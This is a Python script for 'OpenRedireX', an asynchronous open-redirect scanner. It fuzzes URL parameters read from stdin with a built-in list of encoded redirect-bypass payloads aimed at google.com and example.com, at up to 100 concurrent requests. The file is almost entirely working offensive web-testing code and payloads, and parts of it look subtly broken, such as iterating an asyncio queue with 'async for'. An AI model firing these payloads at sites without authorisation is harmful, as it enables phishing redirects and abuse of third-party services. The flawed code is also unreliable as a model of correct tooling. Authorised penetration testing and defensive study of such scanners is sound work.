#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import sys
import socket
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import List, Optional, AsyncIterator
import logging
from dataclasses import dataclass
from termcolor import colored

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stderr)]
)
logger = logging.getLogger('openredirex')

# Error types to catch
HTTP_ERRORS = (
    aiohttp.ClientConnectorError,
    aiohttp.ClientOSError,
    aiohttp.ServerDisconnectedError,
    aiohttp.ServerTimeoutError,
    aiohttp.ServerConnectionError,
    aiohttp.TooManyRedirects,
    UnicodeDecodeError,
    socket.gaierror,
    asyncio.TimeoutError
)

@dataclass
class ScanResult:
    url: str
    payload: str
    redirect_chain: List[str]

DEFAULT_PAYLOADS = [
"//example.com@google.com/%2f..",
"///google.com/%2f..",
"///example.com@google.com/%2f..",
"////google.com/%2f..",
"https://google.com/%2f..",
"https://example.com@google.com/%2f..",
"/https://google.com/%2f..",
"/https://example.com@google.com/%2f..",
"//google.com/%2f%2e%2e",
"//example.com@google.com/%2f%2e%2e",
"///google.com/%2f%2e%2e",
"///example.com@google.com/%2f%2e%2e",
"////google.com/%2f%2e%2e",
"/http://example.com",
"/http:/example.com",
"/https:/%5cexample.com/",
"/https://%09/example.com",
"/https://%5cexample.com",
"/https:///example.com/%2e%2e",
"/https:///example.com/%2f%2e%2e",
"/https://example.com",
"/https://example.com/",
"/https://example.com/%2e%2e",
"/https://example.com/%2e%2e%2f",
"/https://example.com/%2f%2e%2e",
"/https://example.com/%2f..",
"/https://example.com//",
"/https:example.com",
"/%09/example.com",
"/%2f%2fexample.com",
"/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
"/%5cexample.com",
"/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
"/.example.com",
"//%09/example.com",
"//%5cexample.com",
"///%09/example.com",
"///%5cexample.com",
"////%09/example.com",
"////%5cexample.com",
"/////example.com",
"/////example.com/",
"////\\;@example.com",
"////example.com/"
]

class URLProcessor:
    @staticmethod
    def fuzzify_url(url: str, keyword: str) -> str:
        """Replace all parameter values in URL with the keyword."""
        if keyword in url:
            return url

        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        fuzzed_params = [(k, keyword) for k, _ in params]
        fuzzed_query = urlencode(fuzzed_params)

        return urlunparse([
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            fuzzed_query,
            parsed.fragment
        ])

    @staticmethod
    def load_urls() -> List[str]:
        """Read and process URLs from stdin."""
        return [
            URLProcessor.fuzzify_url(line.strip(), "FUZZ")
            for line in sys.stdin if line.strip()
        ]

async def load_payloads(payloads_file: Optional[str]) -> List[str]:
    """Load payloads from file or use defaults."""
    if payloads_file:
        try:
            with open(payloads_file) as f:
                return [line.strip() for line in f if line.strip()]
        except IOError as e:
            logger.error(f"Failed to load payloads file: {e}")
            return DEFAULT_PAYLOADS
    return DEFAULT_PAYLOADS

async def fetch_url(session: aiohttp.ClientSession, url: str) -> Optional[aiohttp.ClientResponse]:
    """Fetch URL with error handling."""
    try:
        async with session.head(
            url,
            allow_redirects=True,
            timeout=aiohttp.ClientTimeout(total=10),
            raise_for_status=False
        ) as response:
            return response
    except HTTP_ERRORS as e:
        logger.debug(f"Error fetching {url}: {type(e).__name__}")
        return None

async def process_url(
    semaphore: asyncio.Semaphore,
    session: aiohttp.ClientSession,
    url: str,
    payload: str,
    keyword: str
) -> Optional[ScanResult]:
    """Process a single URL with a single payload."""
    async with semaphore:
        target_url = url.replace(keyword, payload)
        response = await fetch_url(session, target_url)
        
        if response and response.history:
            return ScanResult(
                url=target_url,
                payload=payload,
                redirect_chain=[str(r.url) for r in response.history] + [str(response.url)]
            )
        return None

async def result_printer(results: AsyncIterator[ScanResult]) -> None:
    """Print results with colored output."""
    async for result in results:
        if len(result.redirect_chain) > 1:
            chain = " → ".join(result.redirect_chain)
            msg = f"OPEN REDIRECT: {result.url} → {chain}"
            print(colored(msg, 'green'))
        else:
            logger.info(f"Redirect: {result.url} → {result.redirect_chain[0]}")

async def worker(
    session: aiohttp.ClientSession,
    url_queue: asyncio.Queue,
    result_queue: asyncio.Queue,
    payloads: List[str],
    keyword: str,
    semaphore: asyncio.Semaphore
) -> None:
    """Worker to process URLs from the queue."""
    while True:
        url = await url_queue.get()
        try:
            for payload in payloads:
                result = await process_url(semaphore, session, url, payload, keyword)
                if result:
                    await result_queue.put(result)
        finally:
            url_queue.task_done()

async def main(args: argparse.Namespace) -> None:
    """Main scanning function."""
    payloads = await load_payloads(args.payloads)
    urls = URLProcessor.load_urls()
    
    logger.info(f"Starting scan with {len(urls)} URLs and {len(payloads)} payloads")
    
    url_queue = asyncio.Queue()
    result_queue = asyncio.Queue()
    
    # Fill the URL queue
    for url in urls:
        await url_queue.put(url)
    
    # Create worker tasks
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=args.concurrency),
        headers={'User-Agent': 'OpenRedireX/1.0'}
    ) as session:
        semaphore = asyncio.Semaphore(args.concurrency)
        
        workers = [
            asyncio.create_task(worker(session, url_queue, result_queue, payloads, args.keyword, semaphore))
            for _ in range(args.concurrency)
        ]
        
        # Start result printer
        printer = asyncio.create_task(result_printer(result_queue))
        
        # Wait for all URLs to be processed
        await url_queue.join()
        
        # Cancel workers
        for task in workers:
            task.cancel()
        
        # Wait for printer to finish
        await result_queue.join()
        printer.cancel()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="OpenRedireX: Advanced Open Redirect Vulnerability Scanner",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        '-p', '--payloads',
        help='File containing custom payloads',
        required=False
    )
    parser.add_argument(
        '-k', '--keyword',
        help='Keyword in URLs to replace with payloads',
        default="FUZZ"
    )
    parser.add_argument(
        '-c', '--concurrency',
        help='Number of concurrent requests',
        type=int,
        default=100
    )
    parser.add_argument(
        '-v', '--verbose',
        help='Enable verbose logging',
        action='store_true'
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)